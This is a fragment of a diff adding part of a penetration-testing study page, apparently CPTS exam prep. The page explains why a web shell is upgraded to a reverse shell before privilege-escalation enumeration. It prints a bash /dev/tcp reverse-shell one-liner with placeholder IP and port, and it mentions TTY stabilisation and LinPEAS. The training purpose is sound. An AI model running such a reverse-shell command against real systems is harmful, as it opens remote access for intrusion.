+  explanation="A web shell is unstable no job control, no interactive commands, single-request execution. First priority is upgrading to a reverse shell (bash -i >& /dev/tcp/<IP>/<PORT> 0>&1), then stabilizing to a full TTY (python3 pty spawn + stty raw). sudo -l and LinPEAS require a stable interactive shell to work properly anyway running LinPEAS through a web shell is slow, fragile, and may timeout mid-scan. Build the foundation first."
+/>
+
+
+<div className="flex flex-wrap gap-2 mb-4">
+  <TagPill color="#ef4444">#Penetration Testing</TagPill>
+  <TagPill color="#f97316">#Red Team</TagPill>
+  <TagPill color="#22c55e">#CPTS</TagPill>
+  <TagPill color="#fcc629">#Linux</TagPill>
+</div>
